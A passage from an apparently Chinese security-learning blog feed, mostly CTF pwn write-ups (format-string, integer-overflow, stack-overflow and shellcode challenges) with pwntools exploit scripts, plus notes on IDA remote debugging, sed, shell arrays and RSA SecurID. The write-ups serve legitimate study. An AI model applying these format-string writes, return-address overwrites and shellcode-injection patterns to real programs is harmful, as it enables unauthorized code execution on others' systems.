I will help you! USE YOU SPELL&quot;);        v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);        read(0, v1, 0x100uLL);        ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);    &#125;    return __readfsqword(0x28u) ^ v3;&#125;</code></pre><p>完成的功能如下：</p><pre><code>比较 main 中分配的空间中低四位和高四位的值，如果不相等那么一直 return 至游戏结束如果相等，那么调用 mmap 分配一块 1000h 大小的空间，其中第三个参数告诉我们，这块空间具有可读可写可执行的权限获取输入并存储到这片空间中强转为函数指针并调用之</code></pre><p>分析并得到 exp</p><p>既然我们通过 mmap 获得了一块可执行的空间，那么可以在这里写入 shellcode 来获取 shell ；但是要让程序的执行流程到达这里，我们需要让 main 中分配的那 8 个字节的空间中，低 4 位和高 4 位的值相等；</p><p>在 main 函数中，我们获得了它们的地址，而在 sub_400BB9 函数中存在着格式化字符串漏洞，有了这两个条件我们就可以修改其中一个值来使它们相等</p><p>在前面的 cheksec 检查中，我们发现这是一个 64 位的程序，而根据调用规约，前 6 个参数是放在寄存器中的，那么我们如何构造 payload 呢？</p><p>回到 sub_400BB9 中，</p><p>wish输入AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p （26338952-0x191e688）</p><pre><code>&#39;Give me an address&#39;26338952And, you wish is:AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%pYour wish isAAAA-0x7fda21f39723-(nil)-0x7fda21e68ef3-0xd-0xffffffffffffff80-0x100000000-0x191e688-0x2d70252d41414141-0x70252d70252d7025-0x252d70252d70252dI hear it, I hear it....</code></pre><p>那么这个 v2 恰恰就是 args 中的第 7 个参数，所以我们可以用 ‘%7$n’ 的方式来访问并修改 main 中分配的空间中的值</p><p>修改至相等后，程序会执行到巫师给予帮助的部分，我们只要在这里写入 shellcode 即可拿到 shell</p><p>所以，最后的 exp 如下：</p><pre><code>from pwn import *p = remote(远程ip, 远程端口)p.recvuntil(&#39;secret[0] is &#39;)# 获取第四位的地址，用切片切掉最后的\n，开始的空格在上面的 recvuntil 中# 获得的数字直接用 int(x, 16) 即可转成十进制整型储存在 addr 中addr = int(p.recvuntil(&#39;\n&#39;)[:-1], 16)p.recvuntil(&#39;name be:\n&#39;)p.sendline(&#39;Yuren&#39;)p.recvuntil(&#39;up?:\n&#39;)p.sendline(&#39;east&#39;)p.recvuntil(&#39;leave(0)?:&#39;)p.sendline(&#39;1&#39;)p.recv()p.sendline(str(addr))p.recv()p.sendline(&#39;%85x%7$n&#39;) #作用是将85写入栈内第7个参数所指向的地址rec = p.recvuntil(&#39;SPELL\n&#39;)context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)# 获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有i386(x86)和amd64(x64)。p.sendline(asm(shellcraft.sh()))p.interactive()</code></pre><p>格式化字符串漏洞还需要继续加强理解利用！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 int_overflow</title>
      <link href="2020/12/19/2020-12-19-CTF_world_pwn_newbee_int_overflow/"/>
      <url>2020/12/19/2020-12-19-CTF_world_pwn_newbee_int_overflow/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为int_overflow</p><p>进行通过file判断附件文件类型</p><pre><code>file int_overflow</code></pre><p>checksec一下，检查一下保护机制</p><pre><code>pwn checksec int_overflow</code></pre><p>nc连接(或者本地运行)，尝试运行一下，没啥功能</p><pre><code>./int_overflow ---------------------~~ Welcome to CTF! ~~    1.Login           2.Exit        ---------------------Your choice:1Please input your username:kobeHello kobePlease input your passwd:kobeSuccess</code></pre><p>IDA反编译</p><p>main函数中没有什么特殊</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;int v4; // [sp+Ch] [bp-Ch]@1setbuf(stdin, 0);setbuf(stdout, 0);setbuf(stderr, 0);puts(&quot;---------------------&quot;);puts(&quot;~~ Welcome to CTF! ~~&quot;);puts(&quot;       1.Login       &quot;);puts(&quot;       2.Exit        &quot;);puts(&quot;---------------------&quot;);printf(&quot;Your choice:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v4);if ( v4 == 1 )&#123;    login();&#125;else&#123;    if ( v4 == 2 )    &#123;    puts(&quot;Bye~&quot;);    exit(0);    &#125;    puts(&quot;Invalid Choice!&quot;);&#125;return 0;&#125;</code></pre><p>进入login函数，接受了一个最大长度为0x199的password</p><pre><code>char *login()&#123;char buf; // [sp+0h] [bp-228h]@1char s; // [sp+200h] [bp-28h]@1memset(&amp;s, 0, 0x20u);memset(&amp;buf, 0, 0x200u);puts(&quot;Please input your username:&quot;);read(0, &amp;s, 0x19u);printf(&quot;Hello %s\n&quot;, &amp;s);puts(&quot;Please input your passwd:&quot;);read(0, &amp;buf, 0x199u);return check_passwd(&amp;buf);&#125;</code></pre><p>进入check_passwd函数</p><pre><code>char *__cdecl check_passwd(char *s)&#123;char *result; // eax@3char dest; // [sp+4h] [bp-14h]@3unsigned __int8 v3; // [sp+Fh] [bp-9h]@1v3 = strlen(s);if ( v3 &lt;= 3u || v3 &gt; 8u )&#123;    puts(&quot;Invalid Password&quot;);    result = (char *)fflush(stdout);&#125;else&#123;    puts(&quot;Success&quot;);    fflush(stdout);    result = strcpy(&amp;dest, s);&#125;return result;&#125;</code></pre><p>用一个一字节变量v3(8bit)存储password的长度，之后存在一个字符串拷贝，拷贝目的地在栈中，长度为14h，及0x14，十进制20</p><p>0x199（十进制409）大于1字节所能表示的255，也就是说，这里存在整数溢出，password字符串的长度可以是3-8个字符，也可以是259-264个字符。</p><p>而在字符串拷贝过程中，20+4（ebp）+4(ret_address)=28字节，即可覆盖函数返回地址，故exp如下</p><p>exp</p><pre><code>from pwn import *p = process(&#39;./int_overflow&#39;)p = remote(&quot;220.249.52.134&quot;,30598)sys_addr = 0x0804868Bpayload=&quot;a&quot; * 0x14 + &quot;aaaa&quot; + p32(sys_addr)+&quot;a&quot;*234 # 构造长262位password，符合条件# payload=payload.ljust(262,&#39;a&#39;) # 左对齐,并使用a填充至指定长度262p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input your username:\n&quot;)p.sendline(&quot;aaaa&quot;)p.recvuntil(&quot;Please input your passwd:\n&quot;)p.sendline(payload)p.interactive()</code></pre><p>整数溢出原理</p><pre><code>整数分为有符号和无符号两种类型，有符号数以最高位作为其符号位，即正整数最高位为1，负数为0，无符号数取值范围为非负数常见各类型占用字节数如下：类型 占用字节 数取值范围Int 4 -2147483648~2147483647Short int 2 -32768~32767Long int 4 -2147483648~2147483647Unsigned int 4 0~4294967295Unsigned short int 2 0~65535Unsigned short int 4 0~4294967295</code></pre><p>C语言测试代码：</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    unsigned short int var1= 1,var2=65537;    if (var1 == var2)    &#123;        printf(&quot;int overflow&quot;);    &#125;    return 0;&#125;编译运行结果输出int overflow也就是说，对于一个2字节的Unsigned short int型变量，它的有效数据长度为两个字节，当它的数据长度超过两个字节时，就溢出，溢出的部分则直接忽略，使用相关变量时，使用的数据仅为最后2个字节，因此就会出现65537等于1的情况，其他类型变量和数值与之类似</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 guess_number</title>
      <link href="2020/12/18/2020-12-18-CTF_world_pwn_newbee_guess_number/"/>
      <url>2020/12/18/2020-12-18-CTF_world_pwn_newbee_guess_number/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为guess_number</p><p>进行通过file判断附件文件类型</p><pre><code>$ file guess_num guess_num: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped</code></pre><p>checksec一下，检查一下保护机制</p><pre><code>$ pwn checksec guess_num[*] &#39;/root/Desktop/ctf-world-pwn/guess_num/guess_num&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>nc连接(或者本地运行)，尝试运行一下，没啥功能</p><pre><code>$ ./guess_num -------------------------------Welcome to a guess number game!-------------------------------Please let me know your name!Your name:kobe-------------Turn:1-------------Please input your guess number:4---------------------------------GG!</code></pre><p>IDA反编译</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;    FILE *v3; // rdi@1    __int64 v4; // rax@1    const char *v5; // rdi@1    __int64 result; // rax@7    __int64 v7; // rsi@7    int v8; // [sp+4h] [bp-3Ch]@1    int i; // [sp+8h] [bp-38h]@1    int v10; // [sp+Ch] [bp-34h]@1    char v11; // [sp+10h] [bp-30h]@1    unsigned int seed[2]; // [sp+30h] [bp-10h]@1    __int64 v13; // [sp+38h] [bp-8h]@1    v13 = *MK_FP(__FS__, 40LL);    setbuf(stdin, 0LL);    setbuf(stdout, 0LL);    v3 = stderr;    setbuf(stderr, 0LL);    v8 = 0;    v10 = 0;    LODWORD(v4) = sub_BB0(v3, 0LL);    *(_QWORD *)seed = v4;    puts(&quot;-------------------------------&quot;);    puts(&quot;Welcome to a guess number game!&quot;);    puts(&quot;-------------------------------&quot;);    puts(&quot;Please let me know your name!&quot;);    printf(&quot;Your name:&quot;);    gets(&amp;v11);    v5 = (const char *)seed[0];    srand(seed[0]);    for ( i = 0; i &lt;= 9; ++i )    &#123;        v10 = rand() % 6 + 1;        printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));        printf(&quot;Please input your guess number:&quot;);        __isoc99_scanf(&quot;%d&quot;, &amp;v8);        puts(&quot;---------------------------------&quot;);        if ( v8 != v10 )        &#123;        puts(&quot;GG!&quot;);        exit(1);        &#125;        v5 = &quot;Success!&quot;;        puts(&quot;Success!&quot;);    &#125;    sub_C3E(v5);    result = 0LL;    v7 = *MK_FP(__FS__, 40LL) ^ v13;    return result;&#125;观察伪代码 得到如下信息：本题是一个猜数字的游戏，需要10次全部输入正确才能得到flag。其中定义了char型 v11,即用户输入name，用gets()函数获取你输入的值，但是没有做限制导致可以覆盖到控制srand函数的种子来控制这个产生伪随机数的函数，从而答对num。</code></pre><p>exp</p><pre><code>from pwn import*from ctypes import*# p = remote(&#39;220.249.52.134&#39;,53901)p = process(&#39;./guess_num&#39;)libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)payload = &#39;a&#39;*0x20 + p64(1)p.recvuntil(&#39;name:&#39;)p.sendline(payload)libc.srand(1)for i in range(10):    num = str(libc.rand()%6+1)    print num    p.recvuntil(&#39;number:&#39;)    p.sendline(num)p.interactive()</code></pre><p>关于exp</p><pre><code>导入pwn，ctypes模块；ctypes模块 是python的外部函数库，用于提供C语言兼容的数据类型，以及调用cdll函数。dll 是动态链接库（Dynamic Link Library） 是用来实现共享函数库概念的一种方式。libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)cdll.LoadLibrary用于装载C语言的动态链接库C语言标准库的方法libc.srand(1)接下来填充20个a覆盖栈libc.srand(1)即调用libc库中srand函数，将产生随机数函数的种子设定为1num = str(libc.rand()%6+1) rand()%6 用于产生0-5的随机数 结尾加1 即产生1-6的随机数（类似骰子）这段我们控制了产生的随机数，然后sendline（num）即可</code></pre><p>或者写randnum.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    srand(0x61616161);    for(int i=0;i&lt;=9;i++)    &#123;        int test = rand()%6+1;        printf(&quot;%d &quot;,test);    &#125;    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><p>编译执行</p><pre><code>gcc randnum.c -o a./a</code></pre><p>得到随机串 5 6 4 6 6 2 3 6 2 2</p><p>远程nc，输入name为36个以上的a，按次序输入上面的随机数，可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA远程调试</title>
      <link href="2020/12/18/2020-12-18-IDA_remote_debug/"/>
      <url>2020/12/18/2020-12-18-IDA_remote_debug/</url>
      
        <content type="html"><![CDATA[<p>kali：192.168.24.150 windows:192.168.24.149</p><p>以调试ctf-pwn题when_did_you_born为例</p><p>将when_did_you_born文件放置在/root/Desktop/ctf-world-pwn/when_did_you_born/when_did_you_born</p><p>将IDA目录下dbgsrv文件夹中的linux_server,linux_serverx64放置在kali中，并赋权限</p><pre><code>chmod a+x linux_serverchmod a+x linux_serverx64</code></pre><p>调试64位程序用linux_serverx64,32位程序用linux_server</p><p>启动linux_serverx64，这里when_did_you_born是64位，故使用linux_serverx64</p><pre><code>root@kali:~/Desktop/ctf-world-pwn# ./linux_serverx64 IDA Linux 64-bit remote debug server(ST) v1.19. Hex-Rays (c) 2004-2015Listening on port #23946...</code></pre><p>回到IDA 选择菜单栏&gt;Debugger&gt;Select a debugger(或者是switch debugger)&gt;选择Remote linux debugger&gt;ok</p><p>设置各种参数(这里调试的文件是when_did_you_born 填写路径 Hostname是linux虚拟机的ip地址 密码是root的密码)</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20201217-205606.jpg"></p><p>ok之后F9程序运行，回到kali端进行交互，输入Birth,Name，运行结果如下，如果需要调试，则下断点即可。</p><pre><code>root@kali:~/Desktop/ctf-world-pwn# ./linux_serverx64 IDA Linux 64-bit remote debug server(ST) v1.19. Hex-Rays (c) 2004-2015Listening on port #23946...=========================================================[1] Accepting connection from 192.168.24.149...What&#39;s Your Birth?abcWhat&#39;s Your Name?efgYou Are Born In 4196144You Are Naive.You Speed One Second Here.[1] Closing connection from 192.168.24.149...</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 hello_pwn</title>
      <link href="2020/12/18/2020-12-18-CTF_world_pwn_newbee_hello_pwn/"/>
      <url>2020/12/18/2020-12-18-CTF_world_pwn_newbee_hello_pwn/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为hello_pwn</p><p>进行通过file判断附件文件类型</p><pre><code>file hello_pwn</code></pre><p>checksec一下，检查一下保护机制</p><pre><code>pwn checksec hello_pwn</code></pre><p>nc连接(或者本地运行)，尝试运行一下，没啥功能</p><pre><code>./hello_pwn ~~ welcome to ctf ~~     lets get helloworld for bof</code></pre><p>IDA反编译</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;alarm(0x3Cu);setbuf(stdout, 0LL);puts(&quot;~~ welcome to ctf ~~     &quot;);puts(&quot;lets get helloworld for bof&quot;);read(0, &amp;unk_601068, 0x10uLL);if ( dword_60106C == &#39;nuaa&#39; )    sub_400686();return 0LL;&#125;其中__int64 sub_400686()&#123;system(&quot;cat flag.txt&quot;);return 0LL;&#125;那很明显只需要dword_60106C位置的字符串为nuaa</code></pre><p>exp</p><pre><code>from pwn import *# r = process(&#39;./hello_pwn&#39;)r = remote(&quot;220.249.52.134&quot;,40228)payload = &#39;a&#39;*4+p32(1853186401)r.recvuntil(&quot;lets get helloworld for bof\n&quot;)r.sendline(payload)print r.recv()</code></pre><p>或者</p><pre><code>echo aaaaaaun |nc 220.249.52.134 40228</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sed命令</title>
      <link href="2020/12/17/2020-12-17-sed/"/>
      <url>2020/12/17/2020-12-17-sed/</url>
      
        <content type="html"><![CDATA[<h2 id="sed-命令是什么"><a href="#sed-命令是什么" class="headerlink" title="sed 命令是什么"></a>sed 命令是什么</h2><p>sed 命令表示 Stream Editor（流编辑器），用来在 Linux 上执行基本的文本操作。它可以执行各种功能，如搜索、查找、修改、插入或删除文件。</p><p>此外，它也可以执行复杂的正则表达式匹配。</p><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><pre><code>查找和替换匹配给定的格式的内容。在指定行查找和替换匹配给定的格式的内容。在所有行查找和替换匹配给定的格式的内容。搜索并同时替换两种不同的模式。</code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><pre><code>[root@www ~]# sed [-nefr] [动作]选项与参数：-n ：使用安静(silent)模式。在一般 sed 的用法中，所有来自 STDIN 的数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。-e ：直接在命令列模式上进行 sed 的动作编辑；-f ：直接将 sed 的动作写在一个文件内， -f filename 则可以运行 filename 内的 sed 动作；-r ：sed 的动作支持的是延伸型正规表示法的语法。(默认是基础正规表示法语法)-i ：直接修改读取的文件内容，而不是输出到终端。动作说明： [n1[,n2]]functionn1, n2 ：不见得会存在，一般代表『选择进行动作的行数』，举例来说，如果我的动作是需要在 10 到 20 行之间进行的，则『 10,20[动作行为] 』function：a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！#进行十六进制替换,将全部\x00\x00\x00\x01替换为空sed -i &#39;s/\x00\x00\x00\x01//g&#39; file# g 是一个全局替换标志sed -i &#39;s/字符串//g&#39; file# 在行中使用/1、/2……/n 等标志来代替相应的匹配sed -i &#39;s/字符串//2&#39; file# 替换从模式的“第 N 个”开始的匹配实例sed -i &#39;s/字符串//2g&#39; file# 在特定的行号搜索和替换模式sed &#39;3 s/unix/linux/&#39; sed-test.txt# 在特定范围行号间搜索和替换模式sed &#39;1,3 s/unix/linux/&#39; sed-test.txt# 需要用反斜杠 \ 来取消转义，为了简化，大部分的人会用竖线 | 作为正则表达式的定位符sed &#39;s/\/bin\/bash/\/usr\/bin\/fish/g&#39; sed-test.txt sed &#39;s|/bin/bash|/usr/bin/fish/|g&#39; sed-test.txt# 特定字符串的删除sed -i &#39;/字符串/d&#39; file# 可以结合使用正则表达式sed -i &#39;s/[0-9]*2020..[a-z]\&#123;2\&#125;//g&#39; sed-test.txt</code></pre><p>参考</p><p><a href="https://www.cnblogs.com/ev-zhk/p/4277023.html">sed命令详解</a></p><p><a href="https://linux.cn/article-11367-1.html">使用 sed 命令查找和替换文件中的字符串的 16 个示例 </a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 数组和字典</title>
      <link href="2020/12/16/2020-12-16-shell_dic_array/"/>
      <url>2020/12/16/2020-12-16-shell_dic_array/</url>
      
        <content type="html"><![CDATA[<p>字典</p><pre><code>#必须先声明declare -A dicdic=([key1]=&quot;value1&quot; [key2]=&quot;value2&quot; [key3]=&quot;value3&quot;)#打印指定key的valueecho $&#123;dic[&quot;key1&quot;]&#125;#打印所有key值echo $&#123;!dic[*]&#125;#打印所有valueecho $&#123;dic[*]&#125;#遍历key值for key in $&#123;!dic[*]&#125;do    echo &quot;$key : $&#123;dic[$key]&#125;&quot;done</code></pre><p>数组</p><pre><code>#数组list=(&quot;value1&quot; &quot;value2&quot; &quot;value3&quot;)#打印指定下标echo $&#123;list[1]&#125;#打印所有下标echo $&#123;!list[*]&#125;#打印数组下标echo $&#123;list[*]&#125;#数组增加一个元素list=(&quot;$&#123;list[@]&#125;&quot; &quot;value3&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell脚本执行时出现declare: not found的解决方法</title>
      <link href="2020/12/16/2020-12-16-shell_dic_declare_not_found/"/>
      <url>2020/12/16/2020-12-16-shell_dic_declare_not_found/</url>
      
        <content type="html"><![CDATA[<p>解决方法：</p><p>执行时由sh build.sh变成bash build.sh可以解决此问题。</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 CGfsb</title>
      <link href="2020/12/09/2020-12-09-CTF_world_pwn_newbee_CGfsb/"/>
      <url>2020/12/09/2020-12-09-CTF_world_pwn_newbee_CGfsb/</url>
      
        <content type="html"><![CDATA[<p>CGfsb(格式化字符串漏洞)</p><p><a href="https://blog.csdn.net/qq_43394612/article/details/84900668">格式化字符串漏洞原理详解</a></p><p>菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用</p><p>下载文件后改名为CGfsb,按照惯例，拿到程序后先扔到Linux下查一下基本信息</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;    int result; // eax@4    int v4; // esi@4    int v5; // [sp+1Eh] [bp-7Eh]@1    int v6; // [sp+22h] [bp-7Ah]@1    __int16 v7; // [sp+26h] [bp-76h]@1    int v8; // [sp+28h] [bp-74h]@1    int v9; // [sp+8Ch] [bp-10h]@1    v9 = *MK_FP(__GS__, 20);    setbuf(stdin, 0);    setbuf(stdout, 0);    setbuf(stderr, 0);    v5 = 0;    v6 = 0;    v7 = 0;    memset(&amp;v8, 0, 0x64u);    puts(&quot;please tell me your name:&quot;);    read(0, &amp;v5, 0xAu);    puts(&quot;leave your message please:&quot;);    fgets((char *)&amp;v8, 100, stdin);    printf(&quot;hello %s&quot;, &amp;v5);    puts(&quot;your message is:&quot;);    printf((const char *)&amp;v8);    if ( pwnme == 8 )    &#123;        puts(&quot;you pwned me, here is your flag:\n&quot;);        system(&quot;cat flag&quot;);    &#125;    else    &#123;        puts(&quot;Thank you!&quot;);    &#125;    result = 0;    v4 = *MK_FP(__GS__, 20) ^ v9;    return result;&#125;</code></pre><p>pwnme=8即可获取flag</p><p>printf((const char *)&amp;v8) </p><p>很明显是格式化字符串漏洞</p><p>因为格式化字符串漏洞是比较古老的漏洞了，已经被研究了好多年，在目前广泛的ASLR和vsprintf/vprintf等新函数的保护下，这个漏洞也已经不常见。格式化字符串漏洞是广泛存在于基于C/C++的可执行文件中的漏洞，于2000年被纰漏。这个漏洞是典型的二进制常见漏洞之一。ctf-wiki上有详细讲解，地址 <a href="https://wiki.x10sec.org/pwn/linux/fmtstr/fmtstr_intro-zh/">https://wiki.x10sec.org/pwn/linux/fmtstr/fmtstr_intro-zh/</a></p><p>exp:</p><pre><code>from pwn import *#r = precess(&quot;./CGfsb&quot;)r = remote(&#39;111.198.29.45&#39;, 46635)pwnme_addr = 0x0804A068           #pwnme地址在伪代码中双击就能查看payload = p32(pwnme_addr) + &#39;aaaa&#39; + &#39;%10$n&#39;     #pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用r.recvuntil(&quot;please tell me your name:\n&quot;)r.sendline(&#39;BurYiA&#39;)r.recvuntil(&quot;leave your message please:\n&quot;)r.sendline(payload)r.interactive()</code></pre><p>参考<a href="https://zhuanlan.zhihu.com/p/97860648"></a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 get_shell</title>
      <link href="2020/12/09/2020-12-09-CTF_world_pwn_newbee_get_shell/"/>
      <url>2020/12/09/2020-12-09-CTF_world_pwn_newbee_get_shell/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为get_shell</p><p>进行通过file判断附件文件类型</p><pre><code>file get_shellget_shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6334e8ad1474b290bdb69d75a1b44ed029669888, not stripped</code></pre><p>checksec一下，检查一下保护机制</p><pre><code>checksec get_shell[*] &#39;/root/Desktop/pwn/get_shell&#39;Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>nc连接(或者本地运行)，尝试运行一下，看看都有什么功能!!直接可以获取flag</p><pre><code>nc 220.249.52.133 35714</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA SecureID</title>
      <link href="2020/12/08/2020-12-08-SecureID/"/>
      <url>2020/12/08/2020-12-08-SecureID/</url>
      
        <content type="html"><![CDATA[<h1 id="SecureID"><a href="#SecureID" class="headerlink" title="SecureID"></a>SecureID</h1><p>在面临网络安全威胁时，用户非常需要有一个相对安全的、性能稳定可靠的、易于使用和管理的身份认证系统，做到可以用非常小的投入来满足电子商务的安全性要求。这正是RSA SecurID网络身份认证系统获得广泛认可和接受的根本原因。</p><p>强大的用户认证系统RSA信息安全解决方案建立在“双因素认证”基础上。该方法的前提是一个单一的记忆因素，如口令，但口令本身只能对真实性进行低级认证，因为任何听到或盗窃口令的人都会显得完全真实；因此需要增加第二个物理认证因素以使认证的确定性按指数递增。</p><p>例如，银行ATM卡就是一个广泛采用的双因素认证机制，ATM卡需要将有效卡和PIN（个人身份号码）结合使用，提供了足够的安全级别，以支持用户对银行服务及资金的访问。</p><p>借助强大的用户认证系统，管理员首先需要向授权的用户发放单独的认证设备，此认证设备根据时间变化，每分钟都会生成一个唯一的不可预测的令牌码，用户个人码再与令牌码组合，形成双因素认证代码，通过时间同步技术将认证服务器与每个认证令牌同步，只有服务器能够分辨该时刻的合法认证代码，确保了高度安全性。</p><p>在常用的网络安全技术中，身份认证技术是其它安全技术的基础，通过与其它技术结合，能提供更安全、更适合应用的解决方案。 局域网、远程拨号、Internet/VPN连接或Intranet/Extranet应用中的用户认证，所有这一切都可以通过RSA Authentication Manager完成。当用户试图访问受保护的系统时，连接设备中内置的专用代理软件将启动一个RSA AUTHENTICATON MANAGER认证会话，而不是基本密码会话。大多数领先的远程访问服务器、防火墙、VPN、路由器、Internet服务器和Internet浏览器产品都内置了与RSA AUTHENTICATON MANAGER双因素认证系统的兼容能力；此外，TACACE+和RADIUS认证系统均支持RSA AUTHENTICATON MANAGER会话。<br>在强大的认证会话中，用户需要输入用户名及由RSA SecurID认证设备生成的用来代替密码的令牌代码，外加一个PIN号码，由代理软件传输给RSA AUTHENTICATON MANAGER，如果信息有效，RSA AUTHENTICATON MANAGER将允许用户访问。用户将被授予与其通行证等级相对应的访问权限，这一权限被RSA AUTHENTICATON MANAGER记录在日志文件中。  </p><p>据IDC的权威统计，RSA在全球身份认证市场获得70％以上的市场份额，成为身份认证市场的事实标准。同时，RSA SecurID获得全球374个产品的支持（截至07年10月资料），可以最大限度保护用户的投资。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/1-1FPG52345293.png"></p><p>参考资料：</p><p><a href="https://wenku.baidu.com/view/ebf1bf2e25c52cc58bd6bed6.html?fr=search-1-wk_sea_es-income2">RSA_SecurID产品简介</a></p><p><a href="https://wenku.baidu.com/view/a69abed077eeaeaad1f34693daef5ef7ba0d123b.html">RSA SecurID Windows Agent安装配置手册</a></p><p><a href="https://www.doc88.com/p-187432937694.html?s=rel&id=3">RSA_SecurID_6 1_安装配置管理手册</a></p><p><a href="https://wenku.baidu.com/view/9e8bd0c5f08583d049649b6648d7c1c709a10bc1.html">RSASecurID管理员操作手册</a></p><p><a href="https://wenku.baidu.com/view/f54fbef14693daef5ef73de2.html?rec_flag=default">RSA配置文档官方</a></p><p><a href="https://wenku.baidu.com/view/3a1680dbce2f0066f5332212.html">全</a></p>]]></content>
      
      
      <categories>
          
          <category> 验证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecureID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>织梦dedecms5.7 sp2 后台 getshell</title>
      <link href="2020/10/20/2020-10-20-dedecms57_install/"/>
      <url>2020/10/20/2020-10-20-dedecms57_install/</url>
      
